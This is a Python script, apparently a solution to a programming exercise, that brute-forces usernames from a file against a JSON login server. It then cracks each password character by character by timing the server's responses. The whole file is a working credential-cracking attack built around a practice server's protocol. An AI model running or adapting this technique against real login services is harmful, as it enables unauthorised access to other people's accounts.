# write your code here
import argparse
import socket
import json
import string
from time import time

def parse_args():
    """
    Parse arguments in order:
        IP address
        port
        # message for sending
    """
    parser = argparse.ArgumentParser()
    parser.add_argument('host', type=str)
    parser.add_argument('port', type=int)
    return parser.parse_args()


def make_payload(login, password):
    return json.dumps({'login': login, 'password': password})


def send_receive(payload, client_socket):
    client_socket.send(payload.encode())
    return json.loads(client_socket.recv(1024).decode())['result']

def main():
    """"""
    args = parse_args()

    with socket.socket() as client_socket, open('logins.txt', 'rt') as fh:
        client_socket.connect((args.host, args.port))
        for line in fh:
            login = line.rstrip()
            payload = make_payload(login, '')
            if send_receive(payload, client_socket) != 'Wrong login!':
                prefix = ''
                for i in range(1, 10):
                    for char in string.ascii_letters + string.digits:
                        password = prefix + char
                        payload = make_payload(login, password)
                        start = time()
                        response = send_receive(payload, client_socket)
                        end = time()
                        if response == 'Connection success!':
                            print(payload)
                            return
                        elif (end - start) > 0.1:
                            prefix = password
                            break


if __name__ == '__main__':
    main()
